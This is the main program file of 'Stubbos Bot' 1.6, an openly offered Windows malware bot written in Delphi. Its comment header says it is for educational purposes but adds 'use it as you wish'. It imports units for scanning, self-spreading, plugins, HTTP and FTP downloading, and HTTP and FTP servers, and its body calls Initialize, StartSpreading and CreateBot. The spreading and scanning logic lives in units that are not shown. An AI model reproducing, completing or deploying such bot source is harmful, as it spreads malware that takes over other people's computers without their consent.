(*
  Stubbos Bot Public Release Version 1.6
   Coded by p0ke - p0ke.no-ip.com/stub/

  This source-code is for educational purposes
  only, use it as you wish.

  Please read GPL.txt and SPL.txt before
  compiling this bot.
*)

program Stubbos;

uses
  Windows,
  untBot in 'untBot.pas',
  untFunctions in 'untFunctions.pas',
  untScan in 'untScan.pas',
  untHTTPServer in 'untHTTPServer.pas',
  untPlugin in 'untPlugin.pas',
  untHTTPDownload in 'untHTTPDownload.pas',
  untFTPDownload in 'untFTPDownload.pas',
  untFTPServer in 'untFTPServer.pas';

{$I config.ini}
{$IFDEF DEBUG_SHOW} {$APPTYPE CONSOLE} {$ENDIF}

begin
  Initialize;
  StartSpreading;
  CreateBot;
end.
 